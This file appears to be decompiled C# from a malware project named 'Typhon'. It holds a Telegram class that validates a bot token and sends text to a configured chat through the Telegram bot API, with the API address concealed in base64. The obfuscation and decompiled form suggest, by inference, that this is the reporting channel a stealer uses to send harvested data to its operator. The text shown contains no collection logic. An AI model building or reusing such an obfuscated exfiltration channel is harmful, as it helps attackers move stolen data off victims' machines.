using System;
using System.Net;
using System.Text;

namespace Typhon
{
	// Token: 0x02000004 RID: 4
	internal class Telegram
	{
		// Token: 0x06000006 RID: 6 RVA: 0x00002244 File Offset: 0x00000444
		public static bool CheckToken()
		{
			return new WebClient().DownloadString("https://api.telegram.org/bot" + Config.TelegramBotToken + "/getMe").StartsWith("{\"ok\":true");
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002274 File Offset: 0x00000474
		public static void SendMessage(string text)
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					Console.WriteLine(webClient.DownloadString(string.Concat(new string[]
					{
						Telegram.TelegramBotAPI,
						Config.TelegramBotToken,
						"/sendMessage?chat_id=",
						Config.TelegramChatID,
						"&text=",
						text,
						"&disable_web_page_preview=True"
					})));
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}

		// Token: 0x04000016 RID: 22
		private static string TelegramBotAPI = Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="));
	}
}
